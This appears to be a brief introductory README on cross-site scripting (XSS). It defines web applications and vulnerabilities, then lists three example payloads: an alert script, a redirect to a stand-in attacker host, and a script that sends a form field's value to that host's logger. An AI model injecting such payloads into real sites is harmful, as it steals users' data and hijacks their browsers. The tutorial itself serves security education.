<p align="center"><img align="center" width="500" height="500" src="./assets/Cross-site-scripting.gif"/></p>

# Cross-site Scripting

 Before we start talking about Cross-site-scripting (XSS), it's important to talk about what a web applications and vulnerability.
### Web application
    Basically, a web application is a piece of software that runs in a web browser, such as Chrome, Firefox etc. Why understand what a web application is? precisely because Cross-site-scripting (XSS) is caused by flaws in web applications themselves. Like Facebook, Olx etc. 
You can learn more about web application here: https://aws.amazon.com/what-is/web-application/
### Vulnerability
    Vulnerability is precisely a weakness in a web application that is exploited through bugs or the structure of the web application itself, if it has flaws, and it is in these flaws that people with malicious intentions can gain access to sensitive and important data.
You can learn more about vulnerabilities here: https://owasp.org/www-community/vulnerabilities/.
#### XSS
    XSS is an injection attack frequently based on JavaScript, but it can also include HTML or any type of code that our browser can execute. They inject into a web application with the focus of being executed by other users. In this way, it can send malicious code to other people who may mistakenly click on a script that captures sensitive or important information. 


### Payloads
Payloads are basically Javascript codes that we can execute on target users' computers.

Examples of payloads:

```
Basic alert payload:
<script>alert('XSS')</script>


Redirection payload:
<script>window.location='http://attack.com'</script>


Form data capture payload:
<script>document.location='http://attack.com/logger.php?data=' +document.getElementById('form_id').value </script>


```

*